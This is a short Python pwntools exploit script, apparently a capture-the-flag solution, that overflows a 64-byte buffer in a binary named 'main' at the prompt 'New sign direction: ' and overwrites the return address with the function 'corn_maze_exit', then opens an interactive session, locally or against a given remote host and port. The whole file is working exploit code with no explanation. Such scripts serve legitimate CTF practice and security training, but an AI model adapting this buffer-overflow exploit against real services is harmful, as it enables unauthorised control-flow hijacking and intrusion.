#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
context.arch = "amd64"

HOST = args.HOST
PORT = int(args.PORT or 0)

if args.REMOTE:
    if not HOST or not PORT:
        log.error("Provide HOST and PORT")
    io = remote(HOST, PORT)
else:
    io = process(elf.path)

payload = b"A" * 64 + p64(elf.sym["corn_maze_exit"])

log.info(f"Target : {hex(elf.sym['corn_maze_exit'])}")
log.info(f"Length : {len(payload)}")

io.recvuntil(b"New sign direction: ")
io.send(payload)

io.interactive()
